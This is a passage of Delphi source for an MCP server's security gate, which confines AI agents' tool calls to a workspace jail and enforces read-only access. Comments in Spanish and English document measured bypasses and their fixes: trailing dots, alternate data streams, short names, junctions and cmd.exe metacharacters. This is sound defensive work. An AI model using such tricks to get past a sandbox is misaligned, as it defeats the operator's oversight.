       Pointer(Mapa), nil) <> nil then
    Mapa.Free;
  Result := GRutasNuestras;
end;

{ Cuantos parametros vigila el suelo. Lo publica delphi_workspace y lo mide
  test_round45 contra las marcas del fuente: un suelo redundante que se
  quedase VACIO (RTTI que no emite, un registro que cambia) no romperia nada
  y nadie lo notaria - que es justo el fallo que hay que poder ver. }
function ServerPathParamCount: Integer;
begin
  Result := RutasNuestras.Count;
end;

{ Las DOS pasadas del suelo, una funcion: ARelativas=False mira las rutas
  absolutas y va en su sitio de siempre; ARelativas=True mira las que no lo
  son y va la ultima. Las dos preguntan lo que preguntaria la tool
  (ReadPathDenied) y en su orden: una unidad virtual no servida (srvz:\,
  srv0:\) sale por su NOMBRE, no como "relativa". }
function ArgPathOutsideDenied(const AToolName: string;
  const AArguments: TJSONObject; ARelativas: Boolean): string;
var
  I: Integer;
  P: TJSONPair;
  V, Que: string;
  Mapa: TDictionary<string, Boolean>;
begin
  Result := '';
  if not Assigned(AArguments) then
    Exit;
  // Sin jaula configurada no hay nada que hacer cumplir (modo local de
  // confianza): el suelo no se inventa una.
  if Length(WorkspaceRoots) = 0 then
    Exit;
  Mapa := RutasNuestras;
  for I := 0 to AArguments.Count - 1 do
  begin
    P := AArguments.Pairs[I];
    if not (P.JsonValue is TJSONString) then
      Continue;
    var Clave := LowerCase(AToolName) + '|' + TMCPSerializer.NormalizeKey(P.JsonString.Value);
    if not Mapa.ContainsKey(Clave) then
      Continue;
    V := TJSONString(P.JsonValue).Value;
    // un parametro opcional vacio no es una ruta: si falta, lo dice la tool
    if V.Trim = '' then
      Continue;
    if EsRutaAbsoluta(V) = ARelativas then
      Continue;
    // Una relativa que la tool resuelve contra una base suya, o que explica
    // ella ([RutaRelativa]), es de la tool. En las demas se resolvia contra
    // la carpeta del proceso (fuera: DENIED enganoso; dentro, si el servidor
    // se lanzo desde una raiz: aceptada y escrita donde nadie dijo).
    if ARelativas and Mapa[Clave] then
      Continue;
    // Quien LEE recibe la negativa de lectura (con la pista de la zona);
    // quien ESCRIBE, la jaula a secas: una pista de lectura en la negativa
    // de un textedit create despistaba (duodecima revision, r12c)
    if LlamadaLee(AToolName, AArguments, Que) then
      Result := ReadPathDenied(V)
    else
      Result := JaulaDenegada(V);
    if Result <> '' then
      Exit;
    // Dentro, pero en una raiz cuya LETRA no esta conectada en el servidor:
    // ninguna tool puede salir bien ahi, y cada una lo decia a su manera
    // ("Directory not found", WS-008) sin decir que no es un error de nombre
    // ni que el arreglo es del operador (Hermes, 5-oct-2026). Sin disco ni
    // red, asi que cabe en cada llamada; y no niega nada que una tool habria
    // aceptado. Una raiz LOCAL cuya carpeta no existe no se niega aqui: una
    // tool que crea podria crearla.
    if not ARelativas then
    begin
      Result := RaizEnLetraNoConectada(V);
      if Result <> '' then
        Exit;
    end;
  end;
end;

type
  TTraduceArg = reference to function(const ANombre, AValor: string): string;

{ Reescribe EN SU SITIO los argumentos de texto de una llamada: ATraduce
  recibe el nombre y el valor y devuelve el valor nuevo (el mismo = sin
  tocar). El recorrido de las dos normalizaciones de la entrada -la unidad
  virtual (ExpandVirtualDrives) y el nombre largo (AlargaRutas)-, escrito
  una vez: la tercera, si llega, es otra ATraduce. }
procedure ReescribeCadenas(const AArguments: TJSONObject; const ATraduce: TTraduceArg);
var
  I: Integer;
  P: TJSONPair;
  Names, Vals: TStringList;
  V, N: string;
begin
  if not Assigned(AArguments) then
    Exit;
  Names := TStringList.Create;
  Vals := TStringList.Create;
  try
    for I := 0 to AArguments.Count - 1 do
    begin
      P := AArguments.Pairs[I];
      if not (P.JsonValue is TJSONString) then
        Continue;
      V := TJSONString(P.JsonValue).Value;
      N := ATraduce(P.JsonString.Value, V);
      if N <> V then
      begin
        Names.Add(P.JsonString.Value);
        Vals.Add(N);
      end;
    end;
    for I := 0 to Names.Count - 1 do
    begin
      AArguments.RemovePair(Names[I]).Free;
      AArguments.AddPair(Names[I], Vals[I]);
    end;
  finally
    Names.Free;
    Vals.Free;
  end;
end;

{ Una ruta marcada [RutaDelServidor] que trae un nombre corto 8.3 (~) llega a
  la tool en su forma LARGA, como una unidad virtual llega ya traducida. Todo
  lo que sale de una ruta -el nombre de una unit, "es la raiz", "es un lugar
  protegido", "es el vault"- se miraba en el texto: UPROVE~1.PAS no era la
  unit UProveedorModelo y el .dpr la seguia listando tras borrarla, y
  OTHERW~1 no era la raiz de otro workspace y se borraba (sexta revision). La
  regla vive aqui, en la entrada, para todas las tools a la vez; las
  comparaciones de dentro usan ademas FormaLarga, por las raices y lugares
  que el operador declara en 8.3. Solo absolutas: una relativa es de la tool
  o de la negativa GUARD-021. }
procedure AlargaRutas(const AToolName: string; const AArguments: TJSONObject);
var
  Mapa: TDictionary<string, Boolean>;
  Tool: string;
begin
  Mapa := RutasNuestras;
  Tool := LowerCase(AToolName);
  ReescribeCadenas(AArguments,
    function(const ANombre, AValor: string): string
    begin
      Result := AValor;
      if (AValor.IndexOf('~') < 0) or not EsRutaAbsoluta(AValor) or
         not Mapa.ContainsKey(Tool + '|' + TMCPSerializer.NormalizeKey(ANombre)) then
        Exit;
      // Alargar NUNCA cambia a que fichero se refiere la llamada. La forma
      // canonica de Windows quita el punto o el espacio final y deshace un
      // ::$DATA: "X.pas." pasaba a ser "X.pas" y "X.pas::$DATA" otra ruta,
      // que se CREABA (medido, test_guard B0c). Una ruta con anomalia sigue
      // tal cual y su negativa (PathAnomaly) la ve como vino.
      if PathAnomaly(AValor) <> '' then
        Exit;
      try
        Result := LongCanonical(AValor);
      except
        Exit(AValor); // una ruta que no parsea sigue a su negativa tal cual
      end;
      // la separacion final, como venia: una carpeta se nombra igual
      if AValor.EndsWith('\') or AValor.EndsWith('/') then
        Result := IncludeTrailingPathDelimiter(Result);
    end);
end;

{ LA negativa de un UNC que no es de ningun sitio declarado, por UN sitio: la
  daban la pasada de la entrada y la jaula, cada una la suya. Si es la ruta
  de RED de un sitio declarado con su letra (una unidad de red), lo dice
  con su mensaje (GUARD-029) y AEsFormaDeRed lo cuenta. Sigue negada -
  cada sitio vale en la forma en que se declaro -, pero el mensaje de la
  jaula saldria ya traducido a esa letra por el enmascarador: "srvx:\a
  esta FUERA; solo se trabaja en srvx:\" (segundo revisor de la 1.8.2;
  medido con J17 de test_git_jaula). Sin abrir nada: FormaDeclarada mira
  la tabla de unidades de la sesion. }
function NegativaDeUnc(const APath: string; out AEsFormaDeRed: Boolean): string;
var
  Declarada: string;
begin
  // el modo local cerrado no tiene sitios: su negativa es la del cierre
  AEsFormaDeRed := False;
  Result := NegativaDeCierre;
  if Result <> '' then
    Exit;
  Declarada := FormaDeclarada(APath);
  AEsFormaDeRed := not SameText(Declarada, APath);
  if AEsFormaDeRed then
    Result := MsgFmt(SR_JAIL_FORMA_DE_RED_FMT, [Declarada])
  else
    Result := MsgFmt(SR_JAIL_FMT, [APath, string.Join(' | ', WorkspaceRoots)]);
end;

{ La pasada de los UNC ajenos en la ENTRADA, sobre las rutas marcadas
  [RutaDelServidor]: antes de alargarlas (AlargaRutas las resuelve) y antes de
  que la tool haga nada con ellas. La negativa, la de NegativaDeUnc. }
function UncAjenoEnArgumentos(const AToolName: string;
  const AArguments: TJSONObject): string;
var
  Mapa: TDictionary<string, Boolean>;
  Tool: string;
  I: Integer;
  P: TJSONPair;
  EsFormaDeRed: Boolean;
begin
  Result := '';
  if not Assigned(AArguments) then
    Exit;
  Mapa := RutasNuestras;
  Tool := LowerCase(AToolName);
  for I := 0 to AArguments.Count - 1 do
  begin
    P := AArguments.Pairs[I];
    if (P.JsonValue is TJSONString) and
       Mapa.ContainsKey(Tool + '|' + TMCPSerializer.NormalizeKey(P.JsonString.Value)) and
       UncFueraDeLugares(TJSONString(P.JsonValue).Value) then
      Exit(NegativaDeUnc(TJSONString(P.JsonValue).Value, EsFormaDeRed));
  end;
end;

function GitCommandIsQuery(const ACmd, AArgs, AMessage: string): Boolean;
begin
  Result := MatchText(Trim(ACmd), ['status', 'diff', 'log', 'show', 'ls-remote']) or
    (MatchText(Trim(ACmd), ['branch', 'tag']) and (Trim(AArgs) = '') and (Trim(AMessage) = '')) or
    // worktree list solo ENSENA las copias de trabajo (1.4.0)
    (SameText(Trim(ACmd), 'worktree') and SameText(Trim(AArgs), 'list')) or
    // ...y stash list, lo aparcado: pasaba por escritura, con el cerrojo
    // de los escritores y parando los motores del repo (1.7.7)
    (SameText(Trim(ACmd), 'stash') and SameText(Trim(AArgs), 'list'));
end;

var
  GAccesos: TArray<TAccesoDeTool>;

procedure AnadeAcceso(const ATool: string; AAcceso: TAccesoTool;
  const ALecturas: TArray<string>; const AParametro: string = 'command';
  const ACondiciones: TArray<string> = nil; const AEfecto: string = '');
var
  F: TAccesoDeTool;
begin
  F.Tool := ATool;
  F.Acceso := AAcceso;
  F.Lecturas := ALecturas;
  F.Parametro := AParametro;
  F.Condiciones := ACondiciones;
  F.Efecto := AEfecto;
  GAccesos := GAccesos + [F];
end;

{ LA tabla (ACCESOS). Lo que no esta aqui LEE. Las mixtas listan lo que LEE:
  un comando desconocido se niega, cerrado (una credencial de solo lectura
  reescribia forms por un comando que no estaba en ninguna lista; auditoria
  25-sep-2026). }
procedure ConstruyeAccesos;
begin
  GAccesos := [];
  // enteras de escritura: negadas de plano en modo solo lectura
  AnadeAcceso('delphi_edit', atEscritura, []);
  AnadeAcceso('delphi_textedit', atEscritura, []);
  AnadeAcceso('delphi_create', atEscritura, []);
  AnadeAcceso('delphi_changeset', atEscritura, []);
  AnadeAcceso('delphi_build', atEscritura, []);
  AnadeAcceso('delphi_package', atEscritura, []);
  AnadeAcceso('delphi_upload', atEscritura, []);
  AnadeAcceso('delphi_delete', atEscritura, []);
  AnadeAcceso('delphi_move', atEscritura, []);
  // tap, type y key actuan sobre el escritorio del destino; screenshot y
  // status leen en espiritu pero viajan por el mismo camino
  AnadeAcceso('delphi_desktop', atEscritura, []);
  // el vault: leerlo vale en solo lectura, escribirlo nunca
  AnadeAcceso('vault_append', atEscritura, []);
  AnadeAcceso('vault_create', atEscritura, []);
  AnadeAcceso('vault_patch', atEscritura, []);
  // mixtas: "view" lee, "add-platform" escribe el .dproj
  AnadeAcceso('delphi_config', atMixta, ['view']);
  // discover solo mira; run construye y EJECUTA
  AnadeAcceso('delphi_test', atMixta, ['discover']);
  AnadeAcceso('delphi_styles', atMixta, ['view', 'get', 'lint']);
  // los listados leen; add-profile escribe un perfil en el servidor y
  // test-connection marca al destino con su credencial guardada
  AnadeAcceso('delphi_paserver', atMixta, ['platforms', 'packages', 'profiles']);
  // to-text / to-binary reescriben el .dfm/.fmx; el resto mira
  AnadeAcceso('delphi_designer', atMixta, ['info', 'prop', 'tree', 'get', 'lint',
    'check-binding', 'binding', 'layout']);
  // mirar el dispositivo (lista, log) no cambia nada; screenshot y logcat
  // con out= ESCRIBEN una captura/un fichero en la jaula (CaptureTarget):
  // no son lecturas para una credencial de solo lectura (r11a H5);
  // connect/disconnect/install/run/tap/key mutan o ejecutan
  AnadeAcceso('delphi_adb', atMixta, ['discover', 'devices', 'logcat'], 'command',
    ['logcat', 'without out= (out= writes the log to a file)']);
  // git decide por ARGUMENTOS (GitCommandIsQuery): se anuncia lo
  // INCONDICIONAL como lectura y lo condicionado con su condicion (branch y
  // tag listan solo sin args ni message; worktree y stash solo args=list). Se
  // anunciaban branch/tag como lecturas y la puerta los negaba con args
  // (r11b H1, r11c H3)
  AnadeAcceso('delphi_git', atMixta, ['status', 'diff', 'log', 'show', 'ls-remote'], 'command',
    ['branch', 'without args or message (then it lists)',
     'tag', 'without args or message (then it lists)',
     'worktree', 'with args=list',
     'stash', 'with args=list']);
  // lecturas para la puerta, con un EFECTO fuera del workspace: el hint MCP
  // "no modifica su entorno" es falso y se dice (r11e H6)
  AnadeAcceso('delphi_report', atLectura, [], 'command', nil,
    'writes a report file on the server for the operator');
  AnadeAcceso('delphi_messages', atLectura, [], 'command', nil,
    'command=read consumes (deletes) the message it delivers');
  // preview lee; apply escribe por el motor de changesets (lo negaba el
  // escritor al llegar a escribir; ahora la puerta, a la entrada, como a todas)
  AnadeAcceso('delphi_rename_symbol', atMixta, ['preview'], 'mode');
end;

function AccesoDeTool(const ATool: string): TAccesoDeTool;
var
  F: TAccesoDeTool;
begin
  for F in GAccesos do
    if SameText(F.Tool, ATool) then
      Exit(F);
  Result.Tool := ATool;
  Result.Acceso := atLectura;
  Result.Lecturas := [];
  Result.Parametro := '';
  Result.Condiciones := nil;
  Result.Efecto := '';
end;

function LlamadaLee(const AToolName: string; const AArguments: TJSONObject;
  out AQue: string): Boolean;
var
  F: TAccesoDeTool;
  Cmd: string;
begin
  AQue := AToolName;
  F := AccesoDeTool(AToolName);
  case F.Acceso of
    atLectura:
      Exit(True);
    atEscritura:
      Exit(False);
  end;
  Cmd := Trim(ArgStr(AArguments, F.Parametro));
  // delphi_test: sin command, project significa run: LA regla de la tool
  // (ComandoDeTest); '' se perdonaba y llegaba al constructor (r11c H2)
  if SameText(AToolName, 'delphi_test') then
    Cmd := ComandoDeTest(Cmd, ArgStr(AArguments, 'project'), ArgStr(AArguments, 'path'));
  // delphi_adb logcat con out= escribe el log en un fichero: no lee
  if SameText(AToolName, 'delphi_adb') and SameText(Cmd, 'logcat') and
     (Trim(ArgStr(AArguments, 'out')) <> '') then
  begin
    AQue := AToolName + ' logcat out=';
    Exit(False);
  end;
  if SameText(AToolName, 'delphi_git') then
  begin
    // la mitad de consulta de git depende de los argumentos: la MISMA
    // clasificacion que usa la propia tool (GitCommandIsQuery)
    AQue := Trim(AToolName + ' ' + Cmd);
    Exit(GitCommandIsQuery(Cmd, ArgStr(AArguments, 'args'), ArgStr(AArguments, 'message')));
  end;
  AQue := AToolName + ' ' + Cmd;
  Result := (Cmd = '') or MatchText(Cmd, F.Lecturas);
end;

function LecturaDenegada(const AToolName: string; const AArguments: TJSONObject): string;
var
  Que: string;
begin
  Result := '';
  if not IsReadOnlyNow then
    Exit;
  if not LlamadaLee(AToolName, AArguments, Que) then
    Result := WriteDenied(Que);
end;

procedure AnunciaAcceso(const AToolName: string; const AEntry: TJSONObject);
var
  F: TAccesoDeTool;
  Ann, Meta: TJSONObject;
  Arr: TJSONArray;
  S: string;
begin
  F := AccesoDeTool(AToolName);
  Ann := TJSONObject.Create;
  // el hint MCP es "no modifica su entorno": una lectura con efecto fuera
  // del workspace (un reporte, un mensaje consumido) no lo cumple
  Ann.AddPair('readOnlyHint', TJSONBool.Create((F.Acceso = atLectura) and (F.Efecto = '')));
  AEntry.AddPair('annotations', Ann);
  Meta := TJSONObject.Create;
  case F.Acceso of
    atLectura:
      Meta.AddPair('access', 'read-only');
    atEscritura:
      Meta.AddPair('access', 'read-write');
    atMixta:
      begin
        Meta.AddPair('access', 'mixed');
        Meta.AddPair('commandParameter', F.Parametro);
        Arr := TJSONArray.Create;
        for S in F.Lecturas do
          Arr.Add(S);
        Meta.AddPair('readOnlyCommands', Arr);
        if Length(F.Condiciones) > 0 then
        begin
          var Cuando := TJSONObject.Create;
          var K := 0;
          while K + 1 <= High(F.Condiciones) do
          begin
            Cuando.AddPair(F.Condiciones[K], F.Condiciones[K + 1]);
            Inc(K, 2);
          end;
          Meta.AddPair('readOnlyWhen', Cuando);
        end;
      end;
  end;
  if F.Efecto <> '' then
    Meta.AddPair('sideEffect', F.Efecto);
  AEntry.AddPair('_meta', Meta);
end;

function ReglasDeLaLlamadaDenegadas(const AToolName: string;
  const AArguments: TJSONObject): string;
var
  GitArgs: string;
begin
  // Duplicate parameter names FIRST, before normalization and before any other
  // check: two keys that normalize the same would let the gate inspect one
  // value while the binder hands the tool the other, and ExpandVirtualDrives
  // below rewrites by first exact name. Fail closed on the ambiguity.
  Result := DuplicateArgDenied(AArguments);
  if Result <> '' then
    Exit;
  // Normalization second, unconditionally: virtual drive units in the
  // arguments become real server paths before any check or any tool.
  ExpandVirtualDrives(AArguments);
  ApplyArgAliases(AToolName, AArguments);
  // un UNC que no es de ningun sitio declarado, fuera por TEXTO antes de
  // tocarlo: alargarlo abajo ya era abrir SMB hacia ese host
  Result := UncAjenoEnArgumentos(AToolName, AArguments);
  if Result <> '' then
    Exit;
  // ...y el nombre LARGO de las rutas marcadas (AlargaRutas)
  AlargaRutas(AToolName, AArguments);
  Result := '';
  // Read-only comes FIRST, for EVERY tool: LA tabla de accesos (ACCESOS,
  // LecturaDenegada), la misma que anuncia tools/list. The argument filters
  // below are universal on purpose, but letting one of them answer first
  // meant a read-only server explained a git remote policy instead of
  // saying the obvious thing: nothing writes here (v0.62). La lista de
  // mutantes estaba DOS veces (una con delphi_desktop, otra sin) y cada
  // mixta en su if, al final de la puerta (28-sep-2026)
  Result := LecturaDenegada(AToolName, AArguments);
  if Result <> '' then
    Exit;
  // EL SUELO de la jaula, para todas las tools: todo argumento marcado
  // [RutaDelServidor] que sea una ruta absoluta tiene que caer dentro de lo
  // que este workspace puede LEER. Redundante a proposito - la nota larga
  // esta sobre ArgPathOutsideDenied. Las RELATIVAS, al final (ToolCallDenied).
  Result := ArgPathOutsideDenied(AToolName, AArguments, False);
  if Result <> '' then
    Exit;
  // Universal git-argument filter (BOTH access levels): a dangerous option
  // would let even a read-write client escape the jail. The single place git
  // freeform args are vetted.
  if SameText(AToolName, 'delphi_git') and Assigned(AArguments) then
  begin
    GitArgs := ArgStr(AArguments, 'args');
    Result := GitArgDenied(GitArgs);
    if Result <> '' then
      Exit;
    // An explicit URL anywhere in a git call is an outbound connection this
    // machine is about to make. It goes through the operator's allowlist -
    // args AND message, because clone carries the URL in the latter.
    Result := GitRemoteDenied(GitArgs);
    if Result = '' then
      Result := GitRemoteDenied(ArgStr(AArguments, 'message'));
    if Result <> '' then
      Exit;
  end;
  // Universal build-argument filter (BOTH access levels): platform, config and
  // target land in a cmd.exe line, so a metacharacter there is arbitrary
  // execution - and it would sail past the jail, the sandbox and the
  // .dproj hazard scanner in a single call.
  if SameText(AToolName, 'delphi_build') then
  begin
    Result := BuildArgDenied(AArguments);
    if Result <> '' then
      Exit;
  end;
  // The workspace ROOT is the jail, not a file: delete/move would relocate the
  // whole workspace and write its recoverable copy in the root's PARENT,
  // outside the roots. Refused for EVERY credential - a read-write agent does
  // it just as thoroughly as a read-only one would like to.
  if MatchText(AToolName, ['delphi_delete', 'delphi_move']) then
  begin
    Result := RootItselfDenied(ArgStr(AArguments, 'path'));
    if Result <> '' then
      Exit;
  end;
  // Universal PAServer-argument filter (BOTH access levels): profile name,
  // host, port, platform and password land on the paclient command line, and
  // the name becomes a file in %APPDATA%.
  if SameText(AToolName, 'delphi_paserver') then
  begin
    Result := PAServerArgDenied(AArguments);
    if Result <> '' then
      Exit;
  end;
  // Universal adb-argument filter (BOTH access levels): address and serial
  // land on the adb command line.
  if SameText(AToolName, 'delphi_adb') then
  begin
    Result := AdbArgDenied(AArguments);
    if Result <> '' then
      Exit;
  end;
end;

{ La puerta de cada llamada: sus reglas y, la ULTIMA, la pasada de las rutas
  relativas del suelo (la nota sobre el suelo dice por que la ultima). }
function ToolCallDenied(const AToolName: string;
  const AArguments: TJSONObject): string;
begin
  Result := ReglasDeLaLlamadaDenegadas(AToolName, AArguments);
  if Result = '' then
    Result := ArgPathOutsideDenied(AToolName, AArguments, True);
end;

function WorkspaceRoots: TArray<string>;
begin
  // A token-scoped session sees ITS workspace's roots as the whole world:
  // every jail check, listing and scan downstream of this ONE function
  // inherits the boundary. Overlap is deliberate and never subtracts (v0.88).
  if HasActiveWS then
    Exit(ActiveWS.Roots);
  // Modo local de lanzamiento: SOLO el entorno, leido por el cargador con
  // todo lo demas (antes aqui, en el primer uso, con cache propia).
  LoadSecurity;
  Result := GRoots;
end;

function WorkspaceReadOnlyPaths: TArray<string>;
begin
  if HasActiveWS then
    Exit(ActiveWS.ReadOnlyPaths);
  LoadSecurity; // modo local: resuelto contra GRoots en el cargador
  Result := GRoPaths;
end;

function WorkspaceReadOnlyRoots: TArray<string>;
begin
  if HasActiveWS then
    Exit(ActiveWS.ReadOnlyRoots);
  LoadSecurity; // modo local: el entorno, cargado UNA vez con todo lo demas
  Result := GRoRoots;
end;

function ReadOnlyRootOf(const APath: string): string;
var
  Full, Real, R: string;
begin
  Result := '';
  try
    // Formas LARGAS canonicas en los dos lados: una raiz declarada con
    // nombres cortos (DFONTA~1) y una ruta que llega resuelta (RealPath la
    // alarga) son el mismo sitio. Comparar texto contra texto no casaba.
    Full := FormaLarga(APath);
    // ...y por la ruta REAL: un junction dentro de una raiz que apunte a una
    // referencia (o a una declarada DENTRO de la raiz) llevaba a ella con
    // un texto que no la nombra, y se escribia (auditoria 25-sep-2026).
    Real := IncludeTrailingPathDelimiter(RealPath(APath));
  except
    Exit;
  end;
  for R in WorkspaceReadOnlyRoots do
    if StartsText(FormaLarga(R), Full) or
       StartsText(IncludeTrailingPathDelimiter(RealPath(SinBarraFinal(R))), Real) then
      Exit(SinBarraFinal(R));
end;

{ La letra de un sitio no existe para este proceso: nada de lo que hay
  detras puede salir bien, en ninguna tool. }
function LetraNoConectada(const ASitio: string): Boolean;
begin
  Result := (LetraDeRuta(ASitio) <> #0) and
    (ClaseDeLetra(LetraDeRuta(ASitio)) = clAusente);
end;

function MotivoRaizNoDisponible(const ARaiz: string): string;
begin
  Result := '';
  if LetraNoConectada(ARaiz) then
    Result := MsgFmt(SF_WS_LETRA_NO_CONECTADA_FMT, [LetraDeRuta(ARaiz)])
  else if (LetraDeRuta(ARaiz) <> #0) and
          (ClaseDeLetra(LetraDeRuta(ARaiz)) = clLocal) and
          not TDirectory.Exists(SinBarraFinal(ARaiz)) then
    Result := MsgText(SF_WS_CARPETA_RAIZ_NO_EXISTE);
end;

{ Las raices y referencias a las que SI se llega: donde seguir trabajando. }
function RaicesDisponibles: string;
var
  R: string;
begin
  Result := '';
  for R in WorkspaceRoots + WorkspaceReadOnlyRoots do
    if MotivoRaizNoDisponible(R) = '' then
    begin
      if Result <> '' then
        Result := Result + ', ';
      Result := Result + SinBarraFinal(R);
    end;
  if Result = '' then
    Result := MsgText(SF_WS_NINGUNA_RAIZ_DISPONIBLE);
end;

function RaizEnLetraNoConectada(const APath: string): string;
var
  R: string;
begin
  Result := '';
  for R in WorkspaceRoots + WorkspaceReadOnlyRoots do
    if LetraNoConectada(R) and EnLugar(APath, R) then
      Exit(MsgFmt(SR_WS_RAIZ_NO_DISPONIBLE_FMT, [SinBarraFinal(R),
        MotivoRaizNoDisponible(R), RaicesDisponibles]));
end;

function WorkspaceJailSummary(out AWarning: Boolean): string;
var
  Roots: TArray<string>;
  Shown: TArray<string>;
  I: Integer;
begin
  Roots := WorkspaceRoots;
  if ModoLocalCerrado <> '' then
  begin
    AWarning := True;
    Result := MsgFmt(SN_GUARD_WORKSPACE_JAIL_CERRADA_FMT, [ModoLocalCerrado]);
  end
  else if GRootsInvalid then
  begin
    AWarning := True;
    Result := MsgText(SN_GUARD_WORKSPACE_JAIL_INVALID_ROOTS);
  end
  else if Length(Roots) = 0 then
  begin
    AWarning := True;
    Result := MsgText(SN_GUARD_WORKSPACE_JAIL_NONE_MODO);
  end
  else
  begin
    AWarning := False;
    // Roots are stored with a trailing delimiter; drop it for readability.
    SetLength(Shown, Length(Roots));
    for I := 0 to High(Roots) do
      Shown[I] := SinBarraFinal(Roots[I]);
    Result := MsgFmt(SL_GUARD_WORKSPACE_JAIL_ROOTS_FMT, [Length(Roots),
      string.Join('  |  ', Shown)]);
  end;
end;

{ Windows silently strips trailing dots/spaces from a file name, so a path
  like "X.pas." creates "X.pas" while any check on the literal string sees a
  different extension. Alternate Data Streams ("X.pas::$DATA") play the same
  trick. Measured bypass in the field test: both defeated the .pas guard of
  delphi_textedit. Any path whose final name would be normalized by the OS
  is refused outright - it is never a legitimate request. }
function PathAnomaly(const APath: string): string;
var
  Name, Rest, Units, List: string;
  C: Char;
begin
  Result := '';
  // Los controles nunca nombran un fichero: NUL trunca el nombre en Win32.
  for C in APath do
    if Ord(C) < 32 then
      Exit(MsgFmt(SR_GUARD_CONTROL_EN_RUTA_FMT, [Ord(C)]));
  // A virtual unit that survived the inbound expansion is one this server does
  // not serve: it must be refused BY NAME, never resolved against the real
  // filesystem (that is what leaked the host's drive letters). Only when a
  // virtual namespace exists at all - with no served drive there is nothing to
  // mask and nothing to name.
  Units := ServedDriveLetters;
  C := VirtualUnitLetter(APath);
  if (Units <> '') and (C <> #0) and (Pos(C, Units) = 0) then
  begin
    for C in Units do
    begin
      if List <> '' then
        List := List + ', ';
      List := List + VirtualUnitOf(C, Units) + ':';
    end;
    Exit(MsgFmt(SR_UNIT_UNKNOWN_FMT, [APath, List]));
  end;
  // Un prefijo de dispositivo o de ruta extendida, y una unidad virtual sin
  // su barra, con SU motivo: caian en el de abajo, "alternate data stream"
  // (sexta revision)
  // ...tambien con barras normales (//?/ salia GUARD-009; septima revision)
  if EsPrefijoDeDispositivo(APath) then
    Exit(MsgFmt(SR_GUARD_PREFIJO_DISPOSITIVO_FMT, [APath]));
  // un comodin no es parte de una ruta: acababa en INTERNAL dentro de
  // Windows, y un move dejaba copia y carpeta (septima revision)
  if (APath.IndexOf('*') >= 0) or (APath.IndexOf('?') >= 0) then
    Exit(MsgFmt(SR_GUARD_COMODIN_FMT, [APath]));
  if (Length(APath) >= 5) and StartsText('srv', APath) and (APath[5] = ':') then
    Exit(MsgFmt(SR_GUARD_UNIDAD_SIN_BARRA_FMT, [APath, Copy(APath, 1, 5)]));
  // ':' is legal only as the drive separator (C:\...): anywhere else it
  // opens an Alternate Data Stream, which hides content from every check.
  Rest := APath;
  if (Length(Rest) >= 2) and (Rest[2] = ':') then
    Rest := Copy(Rest, 3, MaxInt);
  if Rest.Contains(':') then
    Exit(MsgFmt(SR_GUARD_RUTA_CONTIENE_FUERA_UNIDAD_FMT, [APath]));
  // EVERY segment, not just the last: a folder named "notas " normalizes the
  // same way, and checking only the file name left the rest of the path to
  // slip through (field round 9 hit the same class in the vault resolver).
  for Name in PrefijoSinBarra(Rest).Split(['\', '/']) do
  begin
    if Name = '' then
      Continue;
    // "." and ".." are standard navigation, not a normalization trick: the
    // jail canonicalizes before deciding, so an escape via ".." is caught
    // there. Rejecting them here refused legitimate parent-directory paths.
    if (Name = '.') or (Name = '..') then
      Continue;
    // un nombre que Windows reserva para un dispositivo (CON, PRN, AUX, NUL,
    // COM1-9, LPT1-9), con o sin extension: en este Windows 11 se crea como un
    // fichero normal que un Explorer de Windows 10 no abre ni borra; en otros
    // es el dispositivo mismo (decima revision, medido con CON.txt)
    var Base := Name;
    if Base.IndexOf('.') > 0 then
      Base := Base.Substring(0, Base.IndexOf('.'));
    if MatchText(Base.TrimRight, ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'COM2', 'COM3', 'COM4',
         'COM5', 'COM6', 'COM7', 'COM8', 'COM9', 'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6',
         'LPT7', 'LPT8', 'LPT9']) then
      Exit(MsgFmt(SR_GUARD_NOMBRE_RESERVADO_FMT, [Name, APath]));
    // mas de 255 no es un nombre de Windows: SYS-009 INTERNAL al escribir
    // (octava revision)
    if Length(Name) > 255 then
      Exit(MsgFmt(SR_GUARD_NOMBRE_LARGO_FMT, [Length(Name), Copy(Name, 1, 40)]));
    if Name.Trim([' ']).TrimRight([' ', '.']) <> Name then
    begin
      var Sugerido := Name.Trim([' ']).TrimRight([' ', '.']);
      if Sugerido <> '' then
        Sugerido := MsgFmt(SF_GUARD_QUIZAS_FMT, [Sugerido]);
      Exit(MsgFmt(SR_GUARD_NOMBRE_EMPIEZA_TERMINA_PUNTO_FMT, [Name, Sugerido]));
    end;
  end;
end;

{ Optional per-agent write confinement (OFF by default). When on, an identified
  agent may write only inside <root>\<its-name>\... or an explicitly shared
  subfolder - so several agents can share one workspace root without stepping on
  each other. A caller with no identity (stdio, the operator's own console) is
  trusted with everything, the same rule the recoverable trash already uses.
  Reading is never confined: an agent still sees the whole tree. }
function TempFolderName: string;
begin
  Result := '__delphi-temp';
end;

function ServerDir(const ASub: string): string;
begin
  Result := TPath.GetDirectoryName(ParamStr(0));
  if ASub <> '' then
    Result := TPath.Combine(Result, ASub);
end;

function ServerTempDir(const ASub: string): string;
begin
  Result := ServerDir(TempFolderName);
  if ASub <> '' then
    Result := TPath.Combine(Result, ASub);
end;

function ServerCacheDir(const ASub: string): string;
begin
  Result := TPath.Combine(GetEnvironmentVariable('LOCALAPPDATA'), 'DelphiLspMcp');
  if ASub <> '' then
    Result := TPath.Combine(Result, ASub);
end;

procedure EscribeEnCasaDelServidor(const AFichero, ATexto: string);
var
  Tmp: string;
  Err: DWORD;
begin
  // el escritor pregunta EL MISMO (revision de la 1.12.0): escribe solo DENTRO
  // de la casa de caches, y esa casa tiene que ser una ruta absoluta: con
  // LOCALAPPDATA vacia ServerCacheDir es relativa y caeria en la carpeta de
  // trabajo del proceso (System32 en el servicio). Por el TEXTO canonico, no
  // por la ruta real: lo que se guarda es un error de composicion (esa
  // carpeta no la toca ningun agente), y bajo la virtualizacion de un
  // paquete MSIX una subcarpeta recien creada tiene OTRA ruta real que su
  // padre (medido el 4-oct-2026 desde la app de escritorio de Claude:
  // ...\Packages\Claude_...\LocalCache\Local\DelphiLspMcp\designer)
  if not TPath.IsPathRooted(ServerCacheDir) or
     not StartsText(IncludeTrailingPathDelimiter(TPath.GetFullPath(ServerCacheDir)),
       TPath.GetFullPath(AFichero)) then
    raise EInOutError.Create(MsgFmt(SL_CASA_FUERA_FMT, [AFichero, ServerCacheDir]));
  Tmp := AFichero + '.' + IntToStr(GetCurrentThreadId) + '.tmp';
  try
    TFile.WriteAllText(Tmp, ATexto, TEncoding.UTF8);
  except
